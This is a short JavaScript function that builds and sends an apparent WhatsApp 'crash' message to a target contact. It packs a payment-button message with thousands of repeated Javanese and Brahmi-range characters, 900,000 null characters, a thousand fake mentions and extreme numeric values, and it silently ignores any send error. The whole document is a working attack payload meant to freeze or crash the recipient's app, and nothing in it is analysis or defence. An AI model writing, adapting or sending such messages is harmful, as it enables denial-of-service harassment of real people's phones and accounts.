async function DelayCresX7(sock, jid) {
  const msg = {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: `{
  "currency": "IDR",
  "total_amount": {
    "value": 0,
    "offset": 100
  },
  "reference_id": "${Date.now()}",
  "type": "physical-goods",
  "order": {
    "status": "pending",
    "subtotal": {
      "value": 0,
      "offset": 100
    },
    "order_type": "ORDER",
    "items": [
      {
        "name": "${'ꦾ'.repeat(5000)}",
        "amount": {
          "value": 0,
          "offset": 100
        },
        "quantity": 0,
        "sale_amount": {
          "value": 0,
          "offset": 100
        }
      },
      {
        "name": "${'ꦾ'.repeat(4000)}",
        "amount": {
          "value": 999999999,
          "offset": 100
        },
        "quantity": 999,
        "sale_amount": {
          "value": 999999999,
          "offset": 100
        }
      }
    ]
  },
  "payment_settings": [
    {
      "type": "pix_static_code",
      "pix_static_code": {
        "merchant_name": "X7${'ꦾ'.repeat(3000)}",
        "key": "${'\u0000'.repeat(900000)}",
        "key_type": "AsepX7"
      }
    },
    {
      "type": "credit_card",
      "credit_card": {
        "merchant_name": "${'𑇂𑆵𑆴𑆿'.repeat(2000)}",
        "amount": 999999999
      }
    }
  ],
  "share_payment_status": false,
  "expiry_time": ${Date.now() + 999999999},
  "retry_count": 999
}`
          }
        ]
      },
      contextInfo: {
        stanzaId: "ExplostX7",
        mentionedJid: Array.from({ length: 1000 }, (_, i) => `6281${i}@s.whatsapp.net`),
        forwardingScore: 999999999,
        isForwarded: true
      }
    }
  }

  await sock.relayMessage(jid, msg, { participant: { jid: jid } })
}

try {
  await DelayCresX7(sock, jid);
} catch {}
